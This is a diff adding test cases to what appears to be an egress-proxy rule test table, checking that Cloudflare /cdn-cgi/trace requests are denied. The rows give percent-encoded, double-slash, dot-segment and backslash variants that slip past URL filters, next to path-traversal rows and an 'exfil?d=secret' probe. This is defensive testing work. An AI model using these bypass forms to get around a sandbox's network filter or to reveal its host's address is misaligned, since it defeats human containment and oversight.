@@ -189,6 +189,20 @@ check deny  "githubusercontent host not listed"    GET    https://objects.github
 check deny  "path traversal /../"                  GET    https://github.com/Azure/../otherorg/repo
 check deny  "path traversal %2e%2e"                GET    https://github.com/Azure/%2e%2e/otherorg/repo
 check deny  "path traversal ..%2f"                 GET    https://github.com/Azure/..%2fotherorg/repo
+# Cloudflare's /cdn-cgi/trace echoes the client's (the proxy's) public address. Each variant
+# below reached it on api.anthropic.com: Cloudflare decodes %XX of unreserved characters,
+# turns \ into /, merges slashes and drops dot segments.
+check deny  "Cloudflare /cdn-cgi/trace"            GET    https://api.anthropic.com/cdn-cgi/trace
+check deny  "/cdn-cgi/ on claude.ai"               GET    https://claude.ai/cdn-cgi/trace
+check deny  "/cdn-cgi/ on npm"                     GET    https://registry.npmjs.org/cdn-cgi/trace
+check deny  "/cdn-cgi/ as /%63dn-cgi/"             GET    https://api.anthropic.com/%63dn-cgi/trace
+check deny  "/cdn-cgi/ as /cdn%2Dcgi/"             GET    https://api.anthropic.com/cdn%2Dcgi/trace
+check deny  "/cdn-cgi/ fully encoded"              GET    https://api.anthropic.com/%63%64%6E%2D%63%67%69/%74%72%61%63%65
+check deny  "/cdn-cgi/ after //"                   GET    https://api.anthropic.com//cdn-cgi/trace
+check deny  "/cdn-cgi/ after /./"                  GET    https://api.anthropic.com/./cdn-cgi/trace
+check deny  "/cdn-cgi/ after /%2e/"                GET    https://api.anthropic.com/%2e/cdn-cgi/trace
+check deny  "/cdn-cgi/ after a backslash"          GET    'https://api.anthropic.com/\cdn-cgi/trace'
+check allow "control: cdn in a path, no cdn-cgi"   GET    https://github.com/Azure/cdn-tools
 check allow "Debian mirror (http)"                 GET    http://ftp.pl.debian.org/debian/dists/
 check allow "Debian security (https)"              GET    https://security.debian.org/debian-security/dists/
 check deny  "IP literal whose PTR is allowlisted"  GET    "http://$PTR_IP/exfil?d=secret"
